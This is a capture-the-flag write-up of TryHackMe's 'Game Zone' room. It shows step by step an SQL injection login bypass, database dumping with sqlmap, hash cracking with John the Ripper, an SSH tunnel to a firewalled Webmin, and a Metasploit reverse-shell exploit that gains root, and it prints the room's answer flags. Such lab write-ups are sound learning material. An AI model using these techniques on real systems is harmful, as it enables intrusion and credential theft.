# Game Zone on TryHackMe

Room [Game Zone](https://tryhackme.com/room/gamezone)

#

<h3>Make a Directory with the Room Name in the TryHackMe Folder</h3>

- Change directory to /Desktop/Tryhackme.

`cd Desktop/Tryhackme`

- Change a new directory call "GameZone".

`mkdir GameZone`

- Change directory into GameZone.

`cd GameZone/`

<p align="center"> <img src="https://i.imgur.com/OgGde0R.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Deploy the Machine</h3>

Deploy the machine by connecting to TryHackMe network. 

Temporary IP Address: [10.10.143.18]

Introduction: 

This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. 

<h2></h2>

Question: What is the name of the large cartoon avatar holding a sniper on the forum?

`Agent 47`

Navigate to the temporary IP Address [10.10.143.18].
- That character is a famous hitman game character called Agent 47.

<p align="center"> <img src="https://i.imgur.com/NlcEy09.png" height="90%" width="90%" alt=""/>

#

# Obtain access via SQLi

In this task you will understand more about SQL (structured query language) and how you can potentially manipulate queries to communicate with the database.


SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

`SELECT * FROM users WHERE username = :username AND password := password`

In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.

Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it.

Lets use what we've learnt above, to manipulate the query and login without any legitimate credentials.

If we have our username as admin and our password as: ' or 1=1 -- - it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

`SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -`

The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.

The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.

GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.

Use `' or 1=1 -- -` as your username and leave the password blank.

<p align="center"> <img src="https://i.imgur.com/uTDUe8v.png" height="90%" width="90%" alt=""/>

When you've logged in, what page do you get redirected to?

`Portal.php`

<p align="center"> <img src="https://i.imgur.com/pddr8vr.png" height="90%" width="90%" alt=""/>

#

# Using SQLMap 

SQLMap is a popular open-source, automatic SQL injection and database takeover tool.

This comes pre-installed on all version of Kali Linux. Or download [here](https://github.com/sqlmapproject/sqlmap).

There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.

#

# Using SQLMap Questions

Question 1: In the users table, what is the hashed password?

Question 2: What was the username associated with the hashed password?

Question 3: What was the other table name?

#

# Questions

Using the webpage [http://10.10.143.18/portal.php], we are going point SQLMap to the game review search feature.

We will open up Burp Suite to intercept a request made to the search feature.

On Burp Suite > Proxy > Open browser.

<p align="center"> <img src="https://i.imgur.com/l3dtHDV.png" height="90%" width="90%" alt=""/>

On Burp Suite's browser, navigate to [http://10.10.143.18] and login again with `' or 1=1 -- -` to get to the portal page.

- Burp Suite: Turn on Interception.  
- On Portal Page: write "test" on the search bar then click on "Search!"

<p align="center"> <img src="https://i.imgur.com/g8iLsyl.png" height="90%" width="90%" alt=""/>

Burp Suite will have the POST Request. Copy the request and save it into a text file name it "request.txt".

<p align="center"> <img src="https://i.imgur.com/sgTIyW3.png" height="90%" width="90%" alt=""/>

We will now pass the "request.txt" into SQLMap to use our authenticated user session using the command:

`sqlmap -r request.txt --dbms=mysql --dump`

- `sqlmap`: This is the command for SQLmap, a popular tool for detecting and exploiting SQL injection vulnerabilities in web applications.

- `-r request.txt`: Specifies the path to a file (`request.txt`) that contains the HTTP request captured from the web application. This file typically includes the request headers, parameters, and other details.

- `--dbms=mysql`: Specifies the database management system (DBMS) to target. In this case, it's set to MySQL. SQLmap will tailor its attacks based on the characteristics of MySQL.

- `--dump`: This option instructs SQLmap to dump (retrieve) the contents of the database. It attempts to extract information such as database names, table names, and the contents of the tables.

<p align="center"> <img src="https://i.imgur.com/m838T8q.png" height="90%" width="90%" alt=""/>

From the sqlmap command we got the answers for all 3 questions:

Question 1: In the users table, what is the hashed password?

`ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

Question 2: What was the username associated with the hashed password?

`agent47`

Question 3: What was the other table name?

`post`

#

# Cracking a password with JohnTheRipper

John the Ripper (JTR) is a speedy, free, and open-source tool used for cracking passwords. It comes pre-installed on all Kali Linux machines.

We'll use John the Ripper to crack the hash we got earlier. John the Ripper has been around for 15 years, and there are other programs like HashCat that also do password cracking.

Here's how John the Ripper works: It takes a list of words, turns them into hashes using a specific method, and then checks if any of those match the hash of the password you're trying to crack. If there's a match, it means the password is found. Keep in mind that you can't reverse a hash directly, so the program compares hashed versions to find a match.

# Cracking a password with JohnTheRipper Questions 

Question 1: What is the de-hashed password?

Question 2: What is the user flag?

#

# Question 1

Create a new txt file that contains the hash values and name it "hash.txt".

Use John the Ripper to crack the hash.

`john hash.txt --wordlist=../../wordlists/rockyou.txt --format=Raw-SHA256`

<p align="center"> <img src="https://i.imgur.com/K2NFF3S.png" height="90%" width="90%" alt=""/>

Question 1: What is the de-hashed password?

`videogamer124`

#

# Question 2

Now you have a password and username `agent47:videogamer124`. We will try to SSH'ing onto the machine.

Use this command to SSH onto the machine:

`ssh agent47@10.10.143.18`

<p align="center"> <img src="https://i.imgur.com/ujbY9VA.png" height="90%" width="90%" alt=""/>

Use `ls` command to list all the file in the directory. Found "user.txt", use `cat` command to read it.
- Successfully captured the user flag.

<p align="center"> <img src="https://i.imgur.com/BkGGAmS.png" height="90%" width="90%" alt=""/>

Question 2: What is the user flag?

`649ac17b1480ac13ef1e4fa579dac95c`

#

# Exposing services with reverse SSH tunnels

<p align="center"> <img src="https://i.imgur.com/bO9sttb.png" height="90%" width="90%" alt=""/>

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

#

# Exposing services with reverse SSH tunnels Question

Question 1: How many TCP sockets are running?

Question 2: What is the name of the exposed CMS?

Question 3: What is the CMS version?

#

# Question 1

We will use a tool called ss to investigate sockets running on a host.

If we run ss -tulpn it will tell us what socket connections are running

<p align="center"> <img src="https://i.imgur.com/Fuc73J9.png" height="90%" width="90%" alt=""/>

On ssh, run: `ss -tulpn`

<p align="center"> <img src="https://i.imgur.com/IgkQlf8.png" height="90%" width="90%" alt=""/>

Question 1: How many TCP sockets are running?

`5`

#

# Question 2

We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run `ssh -L 10000:localhost:10000 agent@10.10.143.18`

We will open a new terminal and run the command.

<p align="center"> <img src="https://i.imgur.com/XU2mvIZ.png" height="90%" width="90%" alt=""/>

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.

<p align="center"> <img src="https://i.imgur.com/cyJCIrI.png" height="90%" width="90%" alt=""/>

Question 2: What is the name of the exposed CMS?

`Webmin`

#

# Question 3

We will now use agent47:videogamer124 to login to the webpage.

After logging into the webpage. We can see the CMS Version.

<p align="center"> <img src="https://i.imgur.com/IojtiVK.png" height="90%" width="90%" alt=""/>

Question 3: What is the CMS version?

`1.580`

#

# Privilege Escalation with Metasploit

Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.

We will first open Metasploit with `msfconsole` command > `search webmin`.

<p align="center"> <img src="https://i.imgur.com/Bhq4vJX.png" height="90%" width="90%" alt=""/>

We will use the option 0 and show the options for the exploits.

- `use 0` > `show options`

<p align="center"> <img src="https://i.imgur.com/s69cxej.png" height="90%" width="90%" alt=""/>

We will set the all the required fields:

- set PAYLOAD cmd/unix/reverse
- set PASSWORD videogamer124
- set RHOSTS 127.0.0.1
- set RPORT 10000
- set SSL false
- set USERNAME agent47
- set LHOST 10.6.106.187 [your own IP]
- set LPORT 5555

<p align="center"> <img src="https://i.imgur.com/mIQS6bn.png" height="90%" width="90%" alt=""/>

Successfully got in with exploit and gain root privilege.

<p align="center"> <img src="https://i.imgur.com/Zo4IDJb.png" height="90%" width="90%" alt=""/>

Question: What is the root flag?

`a4b945830144bdd71908d12d902adeee`







